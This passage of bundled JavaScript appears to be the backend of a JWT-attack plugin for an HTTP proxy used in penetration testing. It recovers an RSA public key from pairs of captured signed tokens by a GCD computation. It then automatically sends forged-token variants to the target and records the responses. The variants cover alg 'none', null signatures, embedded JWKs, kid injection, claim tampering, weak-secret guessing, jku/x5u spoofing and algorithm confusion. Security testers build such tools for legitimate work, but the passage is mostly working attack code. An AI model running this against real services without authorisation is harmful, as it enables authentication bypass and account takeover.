  const em = Buffer.alloc(keyLen);
  let offset = 0;
  em[offset++] = 0;
  em[offset++] = 1;
  em.fill(255, offset, offset + psLen);
  offset += psLen;
  em[offset++] = 0;
  di.copy(em, offset);
  offset += di.length;
  hash.copy(em, offset);
  return BigInt("0x" + em.toString("hex"));
}
function bufferToBigint(buf) {
  if (buf.length === 0) return 0n;
  return BigInt("0x" + buf.toString("hex"));
}
function bigintToPublicKeyPem(n, e = 65537n) {
  const nHex = n.toString(16);
  const eHex = e.toString(16);
  const nBuf = Buffer.from(nHex.length % 2 ? "0" + nHex : nHex, "hex");
  const eBuf = Buffer.from(eHex.length % 2 ? "0" + eHex : eHex, "hex");
  const nDer = nBuf[0] & 128 ? Buffer.concat([Buffer.from([0]), nBuf]) : nBuf;
  const eDer = eBuf[0] & 128 ? Buffer.concat([Buffer.from([0]), eBuf]) : eBuf;
  const jwk = {
    kty: "RSA",
    n: nBuf.toString("base64url"),
    e: eBuf.toString("base64url")
  };
  try {
    const key = createPublicKey3({ key: jwk, format: "jwk" });
    return key.export({ type: "spki", format: "pem" });
  } catch {
    const inner = encodeSequence(
      Buffer.concat([encodeInteger(nDer), encodeInteger(eDer)])
    );
    const spki = encodeSequence(
      Buffer.concat([
        encodeSequence(
          Buffer.concat([
            // OID rsaEncryption
            Buffer.from("06092a864886f70d010101", "hex"),
            Buffer.from("0500", "hex")
            // NULL
          ])
        ),
        encodeBitString(inner)
      ])
    );
    const b64 = spki.toString("base64");
    const lines = b64.match(/.{1,64}/g).join("\n");
    return `-----BEGIN PUBLIC KEY-----
${lines}
-----END PUBLIC KEY-----
`;
  }
}
function encodeLength(len) {
  if (len < 128) return Buffer.from([len]);
  if (len < 256) return Buffer.from([129, len]);
  return Buffer.from([130, len >> 8 & 255, len & 255]);
}
function encodeSequence(data) {
  return Buffer.concat([Buffer.from([48]), encodeLength(data.length), data]);
}
function encodeInteger(data) {
  return Buffer.concat([Buffer.from([2]), encodeLength(data.length), data]);
}
function encodeBitString(data) {
  const inner = Buffer.concat([Buffer.from([0]), data]);
  return Buffer.concat([Buffer.from([3]), encodeLength(inner.length), inner]);
}
var SMALL_PRIMES = [
  2n,
  3n,
  5n,
  7n,
  11n,
  13n,
  17n,
  19n,
  23n,
  29n,
  31n,
  37n,
  41n,
  43n,
  47n,
  53n,
  59n,
  61n,
  67n,
  71n,
  73n,
  79n,
  83n,
  89n,
  97n,
  101n,
  103n,
  107n,
  109n,
  113n,
  127n,
  131n,
  137n,
  139n,
  149n,
  151n,
  157n,
  163n,
  167n,
  173n,
  179n,
  181n,
  191n,
  193n,
  197n,
  199n,
  211n,
  223n,
  227n,
  229n,
  233n,
  239n,
  241n
];
function stripSmallFactors(n) {
  for (const p of SMALL_PRIMES) {
    while (n % p === 0n) n /= p;
  }
  return n;
}
async function recoverRSAPublicKey(jwt1, jwt2, onProgress) {
  const alg = jwt1.header.alg;
  if (!ALG_TO_HASH[alg]) throw new Error(`Unsupported algorithm: ${alg}`);
  const hashAlg = ALG_TO_HASH[alg];
  const sig1 = b64urlDecode(jwt1.signatureB64);
  const sig2 = b64urlDecode(jwt2.signatureB64);
  const keyLen = sig1.length;
  onProgress?.(`Signature length: ${keyLen * 8} bits, computing hashes\u2026`);
  const msg1 = `${jwt1.headerB64}.${jwt1.payloadB64}`;
  const msg2 = `${jwt2.headerB64}.${jwt2.payloadB64}`;
  const h1 = createHash(hashAlg).update(msg1).digest();
  const h2 = createHash(hashAlg).update(msg2).digest();
  const em1 = buildEM(h1, hashAlg, keyLen);
  const em2 = buildEM(h2, hashAlg, keyLen);
  const s1 = bufferToBigint(sig1);
  const s2 = bufferToBigint(sig2);
  onProgress?.(`Computing s1^e (this may take up to a minute)\u2026`);
  const e = 65537n;
  const s1e = s1 ** e;
  onProgress?.(`Computing s2^e\u2026`);
  const s2e = s2 ** e;
  onProgress?.(`Computing residuals and GCD\u2026`);
  const r1 = s1e - em1;
  const r2 = s2e - em2;
  let nCandidate = gcd(r1 < 0n ? -r1 : r1, r2 < 0n ? -r2 : r2);
  onProgress?.(`Raw GCD computed (${nCandidate.toString(16).length / 2} bytes), removing small factors\u2026`);
  nCandidate = stripSmallFactors(nCandidate);
  const bitLen = nCandidate.toString(2).length;
  if (bitLen < 512) throw new Error(`Recovered modulus too small (${bitLen} bits) \u2014 likely an incorrect pair`);
  onProgress?.(`Recovered ${bitLen}-bit modulus. Building public key\u2026`);
  const pem = bigintToPublicKeyPem(nCandidate);
  return { publicKeyPem: pem, modulusBits: bitLen };
}
async function recoverPublicKeyFromJWTs(jwts, onProgress) {
  const rsJwts = jwts.filter((j) => j.header.alg && ALG_TO_HASH[j.header.alg]);
  if (rsJwts.length < 2) {
    throw new Error("Need at least 2 RS-family JWTs with the same algorithm");
  }
  const byAlg = {};
  for (const jwt of rsJwts) {
    const alg = jwt.header.alg;
    (byAlg[alg] ??= []).push(jwt);
  }
  const results = [];
  for (const [alg, group] of Object.entries(byAlg)) {
    if (group.length < 2) continue;
    onProgress?.(`Attempting key recovery for ${alg} with ${group.length} JWTs\u2026`);
    for (let i = 0; i < Math.min(group.length - 1, 3); i++) {
      for (let j = i + 1; j < Math.min(group.length, 4); j++) {
        try {
          const result = await recoverRSAPublicKey(group[i], group[j], onProgress);
          results.push(result);
          break;
        } catch (err) {
          onProgress?.(`Pair ${i},${j} failed: ${err.message}`);
        }
      }
      if (results.find((r) => r.modulusBits > 0)) break;
    }
  }
  return results;
}

// packages/backend/src/index.ts
async function attackJwt(sdk, requestId, config) {
  const sessionId = Math.random().toString(36).slice(2);
  const errors = [];
  (async () => {
    const reqResp = await sdk.requests.get(requestId);
    if (!reqResp) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: ["Request not found"] });
      return;
    }
    const { request } = reqResp;
    const spec = request.toSpec();
    const locations = findJWTsInSpec(spec);
    if (locations.length === 0) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: ["No JWT found in request"] });
      return;
    }
    const loc = locations[0];
    const originalJWT = loc.jwt;
    let parsed;
    try {
      parsed = parseJWT(originalJWT);
    } catch (e) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: [`JWT parse failed: ${e.message}`] });
      return;
    }
    const recoveredKeys = [];
    const algFamily = getAlgorithmFamily(parsed.header.alg);
    if (config.enabledAttacks.algConfusion && (algFamily === "RS" || algFamily === "PS" || algFamily === "ES")) {
      try {
        const historyJWTs = await collectHistoryJWTs(sdk, request.getHost(), 100);
        if (historyJWTs.length >= 2) {
          sdk.api.send("jwt-key-recovery-progress", {
            sessionId,
            message: `Found ${historyJWTs.length} JWTs in history \u2014 attempting key recovery\u2026`
          });
          const keyResults = await recoverPublicKeyFromJWTs(
            historyJWTs,
            (msg) => sdk.api.send("jwt-key-recovery-progress", { sessionId, message: msg })
          );
          for (const r of keyResults) {
            recoveredKeys.push(r.publicKeyPem);
          }
          sdk.api.send("jwt-key-recovery-complete", { sessionId, keys: recoveredKeys });
        }
      } catch {
      }
    }
    const attacks = [];
    const merge = (arr) => attacks.push(...arr);
    if (config.enabledAttacks.none) merge(buildNoneAttacks(parsed));
    if (config.enabledAttacks.nullSig) merge(buildNullSigAttacks(parsed));
    if (config.enabledAttacks.embeddedJwk) merge(buildEmbeddedJWKAttacks(parsed));
    if (config.enabledAttacks.kidInject) merge(buildKIDInjectionAttacks(parsed));
    if (config.enabledAttacks.claimTamper) merge(buildClaimTamperAttacks(parsed));
    if (config.enabledAttacks.weakSecret) {
      merge(await buildWeakSecretAttacks(parsed, config, originalJWT));
    }
    if (config.enabledAttacks.jkuSpoof || config.enabledAttacks.x5uSpoof) {
      const { attacks: spoofAttacks, jwksContent, jwksKey } = buildJKUSpoofAttacks(parsed, config);
      merge(spoofAttacks);
      if (jwksContent && jwksKey) {
        sdk.api.send("jwks-payload", { sessionId, jwksJson: jwksContent, privateKeyPem: jwksKey });
      }
    }
    if (config.enabledAttacks.algConfusion) {
      const confusionAttacks = await buildAlgConfusionAttacks(
        parsed,
        request.getHost(),
        request.getPort(),
        request.getTls(),
        config,
        recoveredKeys
      );
      merge(confusionAttacks);
    }
    sdk.api.send("jwt-attack-started", {
      sessionId,
      requestId,
      total: attacks.length
    });
    for (const attack of attacks) {
      try {
        const attackSpec = cloneSpecWithJWT(spec, loc, attack.modifiedJWT);
        const start = Date.now();
        const sent = await sdk.requests.send(attackSpec);
        const durationMs = Date.now() - start;
        attack.requestId = sent.request?.getId();
        attack.durationMs = durationMs;
        if (sent.response) {
          attack.responseStatus = sent.response.getCode();
          const body = sent.response.getBody();
          const bodyText = body ? await bodyToText(body) : "";
          attack.responseLength = bodyText.length;
          attack.responseBody = bodyText.slice(0, 4096);
          const headers = sent.response.getHeaders();
          attack.responseHeaders = flattenHeaders(headers);
        }
      } catch (e) {
        attack.error = e.message;
        errors.push(`[${attack.techniqueName}] ${attack.error}`);
      }
      sdk.api.send("jwt-attack-result", { sessionId, result: attack });
    }
    sdk.api.send("jwt-attack-complete", { sessionId, errors });
  })().catch((e) => {
    sdk.api.send("jwt-attack-complete", { sessionId, errors: [e.message] });
  });
  return { sessionId };
}
async function getJWTsInRequest(sdk, requestId) {
  const reqResp = await sdk.requests.get(requestId);
  if (!reqResp) return [];
  return findJWTsInSpec(reqResp.request.toSpec());
}
function findJWTsInSpec(spec) {
  const locations = [];
  const headers = spec.getHeaders();
  const authVals = headers["authorization"] ?? headers["Authorization"] ?? [];
  for (const val of authVals) {
    const match = val.match(/^(Bearer\s+)(.+)$/i);
    if (match && looksLikeJWT(match[2])) {
      locations.push({ type: "header", headerName: "Authorization", prefix: match[1], jwt: match[2] });
    } else if (looksLikeJWT(val)) {
      locations.push({ type: "header", headerName: "Authorization", prefix: "", jwt: val });
    }
  }
  const cookieVals = headers["cookie"] ?? headers["Cookie"] ?? [];
  for (const cookieStr of cookieVals) {
    const cookies = parseCookies(cookieStr);
    for (const [name, value] of Object.entries(cookies)) {
      if (looksLikeJWT(value)) {
        locations.push({ type: "cookie", cookieName: name, jwt: value });
      }
    }
  }
  for (const name of ["X-Auth-Token", "X-Access-Token", "X-JWT-Token", "Token"]) {
    const vals = headers[name.toLowerCase()] ?? headers[name] ?? [];
    for (const val of vals) {
      if (looksLikeJWT(val)) {
        locations.push({ type: "header", headerName: name, prefix: "", jwt: val });
      }
    }
  }
  const body = spec.getBody?.();
  if (body) {
    try {
      const text = typeof body.toText === "function" ? body.toText() : body.toString();
      const json = JSON.parse(text);
      for (const key of ["token", "access_token", "id_token", "jwt", "auth_token", "refresh_token"]) {
        if (typeof json[key] === "string" && looksLikeJWT(json[key])) {
          locations.push({ type: "body-json", jsonKey: key, jwt: json[key] });
        }
      }
    } catch {
    }
  }
  return locations;
}
function cloneSpecWithJWT(original, loc, newJWT) {
  const clone = RequestSpec.parse(original.getRaw());
  if (loc.type === "header" && loc.headerName) {
    clone.setHeader(loc.headerName, `${loc.prefix ?? ""}${newJWT}`);
  } else if (loc.type === "cookie" && loc.cookieName) {
    const headers = clone.getHeaders();
    const cookieVals = headers["cookie"] ?? headers["Cookie"] ?? [];
    const cookieStr = cookieVals[0] ?? "";
    const cookies = parseCookies(cookieStr);
    cookies[loc.cookieName] = newJWT;
    const newCookie = Object.entries(cookies).map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join("; ");
    clone.setHeader("Cookie", newCookie);
  } else if (loc.type === "body-json" && loc.jsonKey) {
    const body = clone.getBody?.();
    if (body) {
      try {
        const text = typeof body.toText === "function" ? body.toText() : body.toString();
        const json = JSON.parse(text);
        json[loc.jsonKey] = newJWT;
        clone.setBody(JSON.stringify(json));
      } catch {
      }
    }
  }
  return clone;
}
async function bodyToText(body) {
  if (typeof body === "string") return body;
  if (body && typeof body.toText === "function") {
    return body.toText();
  }
  if (body && typeof body.toRaw === "function") {
    return Buffer.from(body.toRaw()).toString("utf8");
  }
  return "";
}
function flattenHeaders(headers) {
  const out = {};
  for (const [k, vs] of Object.entries(headers)) {
    out[k] = vs.join(", ");
  }
  return out;
}
async function collectHistoryJWTs(sdk, host, limit) {
  const results = [];
  try {
    const page = await sdk.requests.query().descending("req", "id").first(limit).execute();
    const conn = page;
    for (const item of conn.items ?? []) {
      if (!item.request || item.request.getHost() !== host) continue;
      const spec = item.request.toSpec();
      const locs = findJWTsInSpec(spec);
      for (const loc of locs) {
        try {
          const parsed = parseJWT(loc.jwt);
          const fam = getAlgorithmFamily(parsed.header.alg);
          if (fam === "RS" || fam === "PS") {
            results.push(parsed);
            if (results.length >= 10) return results;
          }
        } catch {
        }
      }
    }
  } catch {
  }
  return results;
}
function init(sdk) {
  sdk.api.register("attackJwt", attackJwt);
  sdk.api.register("getJWTsInRequest", getJWTsInRequest);
}
export {
  init
};
